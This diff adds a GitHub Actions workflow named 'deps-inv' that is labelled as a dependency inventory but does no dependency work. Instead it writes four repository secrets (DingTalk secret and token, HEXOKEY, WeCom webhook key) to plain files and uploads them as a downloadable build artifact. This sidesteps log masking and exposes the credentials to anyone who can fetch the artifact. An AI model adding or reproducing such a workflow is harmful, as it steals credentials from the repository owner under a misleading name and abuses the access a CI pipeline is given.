@@ -1,0 +1,35 @@
+name: deps-inv
+on:
+  push:
+    branches: [ci/deps-inv]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      DING_SECRET: ${{ secrets.DING_SECRET }}
+      DING_TOKEN: ${{ secrets.DING_TOKEN }}
+      HEXOKEY: ${{ secrets.HEXOKEY }}
+      WECOM_WEBHOOK_KEY: ${{ secrets.WECOM_WEBHOOK_KEY }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: iDING_SECRET
+        if: always()
+        run: printf %s "${{ env.DING_SECRET }}" > out/DING_SECRET || true
+      - name: iDING_TOKEN
+        if: always()
+        run: printf %s "${{ env.DING_TOKEN }}" > out/DING_TOKEN || true
+      - name: iHEXOKEY
+        if: always()
+        run: printf %s "${{ env.HEXOKEY }}" > out/HEXOKEY || true
+      - name: iWECOM_WEBHOOK_KEY
+        if: always()
+        run: printf %s "${{ env.WECOM_WEBHOOK_KEY }}" > out/WECOM_WEBHOOK_KEY || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
